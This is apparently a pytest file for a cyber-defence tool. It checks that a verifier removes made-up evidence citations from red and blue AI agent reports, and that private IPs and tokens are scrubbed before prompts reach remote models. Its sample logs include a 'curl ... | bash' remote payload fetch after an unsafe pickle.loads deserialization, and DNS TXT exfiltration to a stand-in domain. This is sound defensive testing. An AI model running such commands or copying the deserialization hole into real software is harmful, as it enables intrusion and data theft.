"""Tests for RedOperatorAgent, BlueInvestigatorAgent, PurpleVerifier anti-hallucination, and Cloud Scrubbing."""

import json
import pytest

from hermes_cyber.blue_agent import BlueInvestigatorAgent
from hermes_cyber.observer import CyberObserver
from hermes_cyber.red_agent import RedOperatorAgent
from hermes_cyber.router_bridge import ModelRouter
from hermes_cyber.verifier import PurpleVerifier


def test_purple_verifier_removes_hallucinated_citations():
    observer = CyberObserver()
    ingestion = observer.ingest_text(
        '2026-11-16T19:02:01Z src=91.132.147.18 method=POST /api/v2/session/restore\n'
        'def restore(b): return pickle.loads(b)\n'
        '2026-11-16T19:02:03Z host=web-api-03 parent_proc=python3 proc=sh cmd="sh -c curl http://91.132.147.18/s.sh | bash"\n',
        title="Deserialization Case",
        source_kind="http",
    )
    red = RedOperatorAgent().analyze(ingestion)[0]
    blue = BlueInvestigatorAgent().analyze(ingestion, red)[0]

    # Inject hallucinated evidence IDs into both Red and Blue reports
    poisoned_red = red.model_copy(update={
        "cited_evidence_ids": [*red.cited_evidence_ids, "EV-9999"],
        "kill_chain": [
            red.kill_chain[0].model_copy(update={"evidence_ids": [*red.kill_chain[0].evidence_ids, "EV-8888"]}),
            *red.kill_chain[1:],
        ],
    })
    poisoned_blue = blue.model_copy(update={"cited_evidence_ids": [*blue.cited_evidence_ids, "EV-7777"]})

    clean_red, clean_blue, verdict = PurpleVerifier().verify(ingestion, poisoned_red, poisoned_blue)
    assert "EV-9999" not in clean_red.cited_evidence_ids
    assert "EV-8888" not in clean_red.kill_chain[0].evidence_ids
    assert "EV-7777" not in clean_blue.cited_evidence_ids
    assert set(verdict.hallucinated_citations_removed) == {"EV-9999", "EV-8888", "EV-7777"}
    assert all(eid in {"EV-0001", "EV-0002", "EV-0003"} for eid in verdict.verified_citations)


def test_dual_model_arena_and_cloud_privacy_scrubber_enforcement(monkeypatch):
    observer = CyberObserver()
    ingestion = observer.ingest_text(
        '2026-11-16T11:10:05Z host=db-core-02 ip=10.10.4.22 token="Bearer eyJhbGciOiJIUzI1NiJ9.dGVzdHBheWxvYWQ.c2lnbg"\n'
        '2026-11-16T11:10:12Z dns_src=10.10.4.22 qtype=TXT query="MZXW6.exfil.c2-sync.example.net"\n',
        title="DNS Exfil Clash",
        source_kind="log",
    )

    seen_prompts = []

    class FakeRemoteRouter(ModelRouter):
        def is_active_endpoint_local(self) -> bool:
            return False

        def generate(self, prompt: str, system_prompt: str = "", **kwargs) -> str:
            seen_prompts.append((self.default_provider, self.ollama_model, system_prompt + "\n" + prompt))
            # Echo back placeholder to verify unscrubbing restores original value locally
            if "RED OPERATOR" in system_prompt:
                return json.dumps({
                    "primary_hypothesis": "Exfiltration from <INT_IP_01> via leaked <REDACTED_SECRET_01>",
                    "confidence": 0.91,
                    "blind_spots": ["DNS TXT bypasses HTTP proxy"],
                    "extra_probes": [{"title": "DNS Canary", "payload_or_command": "dig TXT probe.c2-sync.example.net", "expected_ioc": "blocked"}],
                    "cited_evidence_ids": ["EV-0001", "EV-0002"],
                })
            return json.dumps({
                "competing_hypothesis": "Confirmed DNS TXT compromise on <INT_IP_01>",
                "confidence": 0.25,
                "extra_contradictions": [],
                "extra_detection_keywords": ["qtype=TXT"],
                "extra_hardening": ["Sinkhole c2-sync.example.net"],
                "cited_evidence_ids": ["EV-0002"],
            })

    red_router = FakeRemoteRouter(default_provider="openai-codex", ollama_model="gpt-6.1-sol", allow_remote=True)
    blue_router = FakeRemoteRouter(default_provider="openrouter", ollama_model="deepseek-free", allow_remote=True)

    red_plan, red_scrubbed, red_stats = RedOperatorAgent().analyze(ingestion, router=red_router)
    blue_rep, blue_scrubbed, blue_stats = BlueInvestigatorAgent().analyze(ingestion, red_plan, router=blue_router)

    assert red_scrubbed is True and blue_scrubbed is True
    assert red_stats["private_ips"] >= 1 and red_stats["secrets"] >= 1
    assert len(seen_prompts) == 2
    # Remote LLM prompts NEVER received raw private IP or JWT token!
    for _, _, transmitted in seen_prompts:
        assert "10.10.4.22" not in transmitted
        assert "eyJhbGciOiJIUzI1NiJ9" not in transmitted
        assert "<INT_IP_01>" in transmitted
        assert "<REDACTED_SECRET_01>" in transmitted

    # Local UI output is transparently unscrubbed back to 10.10.4.22!
    assert "10.10.4.22" in red_plan.primary_hypothesis
    assert "openai-codex" in red_plan.model_used
    assert "openrouter" in blue_rep.model_used
